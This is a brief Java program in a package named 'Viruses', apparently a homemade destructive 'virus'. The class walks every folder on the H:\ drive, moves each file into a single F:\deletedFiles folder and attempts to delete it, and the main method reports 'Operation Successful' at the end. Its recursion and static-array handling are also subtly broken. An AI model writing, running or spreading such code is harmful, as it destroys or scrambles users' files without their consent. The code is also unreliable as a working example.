package Viruses;

import java.io.*;

public class RemoveFiles {
	
	static File fileNames;
	static File[] fileList;

	public static void main(String[] args) {
		fileNames = new File("H:\\");
		fetchDirectory(fileNames);
		if(fileList != null)
			System.out.println("Operation Successful");
		else {
			System.out.println("Operation Unsuccessful, drive not found");
		}
		
	}
	
	static public void fetchDirectory(File fileNames) {
		fileList = fileNames.listFiles();
		if(fileList != null) {
			File[] fileDirectoryList = new File[fileList.length];
			int k=0;
			
			for(File file: fileList) {
				
				File newFile = new File("F:\\deletedFiles\\", file.getName());
				file.renameTo(newFile);
				if(!file.delete()) {
					fileDirectoryList[k++] = file;
				}
			}
			for(File file: fileDirectoryList) {
				if(file != null)
					fetchDirectory(file);
			}
		}
	}
}